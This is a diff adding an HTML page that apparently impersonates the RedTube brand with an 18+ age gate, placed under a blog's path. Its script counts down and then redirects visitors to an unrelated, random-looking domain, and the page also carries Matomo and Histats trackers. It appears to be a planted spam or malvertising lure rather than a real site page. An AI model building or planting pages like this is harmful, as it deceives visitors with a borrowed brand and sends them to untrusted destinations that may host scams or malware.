@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8" />
+	<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+	<link rel="icon" type="image/png" href="/ico/favicon-96x96.png" sizes="96x96" />
+	<title>Continue to https://dynamicsninja.blog/join/4202</title>
+	<style>
+		body {
+			background-color: #0d0d0d;
+			color: #fff;
+			font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+			margin: 0;
+			display: flex;
+			justify-content: center;
+			align-items: center;
+			height: 100vh;
+		}
+		.container {
+			background-color: #1a1a1a;
+			padding: 30px;
+			border-radius: 10px;
+			max-width: 480px;
+			width: 90%;
+			text-align: center;
+			box-shadow: 0 0 15px rgba(255, 0, 0, 0.3);
+		}
+		.logo {
+			font-size: 32px;
+			font-weight: bold;
+			color: #e50914;
+			margin-bottom: 10px;
+		}
+		h2 {
+			font-size: 22px;
+			margin-bottom: 10px;
+			color: #fff;
+		}
+		p {
+			font-size: 14px;
+			color: #ccc;
+		}
+		.buttons {
+			margin-top: 25px;
+			display: flex;
+			flex-direction: column;
+			gap: 12px;
+		}
+		.buttons button {
+			padding: 12px;
+			font-size: 16px;
+			border-radius: 5px;
+			cursor: pointer;
+			border: none;
+		}
+		.enter {
+			background-color: #e50914;
+			color: white;
+		}
+		.exit {
+			background-color: transparent;
+			border: 1px solid #aaa;
+			color: #aaa;
+		}
+		#loading {
+			display: none;
+			margin-top: 20px;
+		}
+		.spinner {
+			border: 4px solid #444;
+			border-top: 4px solid #e50914;
+			border-radius: 50%;
+			width: 28px;
+			height: 28px;
+			animation: spin 1s linear infinite;
+			margin: 10px auto;
+		}
+		.countdown {
+			margin-top: 10px;
+			font-size: 13px;
+			color: #aaa;
+		}
+		@keyframes spin {
+			0% { transform: rotate(0deg); }
+			100% { transform: rotate(360deg); }
+		}
+	</style>
+</head>
+<body>
+
+<div class="container">
+	<div class="logo">RED<span style="color:#fff;">TUBE</span></div>
+	<h2>You're One Step Away</h2>
+	<p>This content is intended for viewers 18+ and may include explicit material. Please confirm your age to continue.</p>
+	<div class="buttons">
+		<button class="enter" onclick="verifyAge()">Yes, I'm 18+ â Enter</button>
+		<button class="exit" onclick="location.href='/join/4202'">No, Take Me Back</button>
+	</div>
+
+	<div id="loading">
+		<div class="spinner"></div>
+		Redirecting in <span id="countdown">5</span> seconds...
+	</div>
+</div>
+
+<script>
+	function verifyAge() {
+		document.querySelector('.buttons').style.display = 'none';
+		document.getElementById('loading').style.display = 'block';
+
+		let seconds = 5;
+		const countdownEl = document.getElementById('countdown');
+		const timer = setInterval(() => {
+			seconds--;
+			countdownEl.textContent = seconds;
+			if (seconds <= 0) {
+				clearInterval(timer);
+				window.location.href = "https://rrh2mrb.elegantheartedaffection.org/y6wph3e";
+			}
+		}, 1000);
+	}
+</script>
+
+<!-- Matomo -->
+<script>
+  var _paq = window._paq = window._paq || [];
+  _paq.push(['setCustomDimension', 1, 'dynamicsninja.blog']);
+  _paq.push(['trackPageView']);
+  _paq.push(['enableLinkTracking']);
+  (function() {
+    var u="//matomo.dynamicsninja.blog/";
+    _paq.push(['setTrackerUrl', u+'matomo.php']);
+    _paq.push(['setSiteId', '1']);
+    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+    g.async=true; g.src=u+'matomo.js'; s.parentNode.insertBefore(g,s);
+  })();
+</script>
+<!-- End Matomo Code -->
+
+<!-- Histats.com  START  (aync)-->
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,4980293,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4980293&101" alt="website statistics" border="0"></a></noscript>
+<!-- Histats.com  END  -->
+
+</body>
+</html>
+
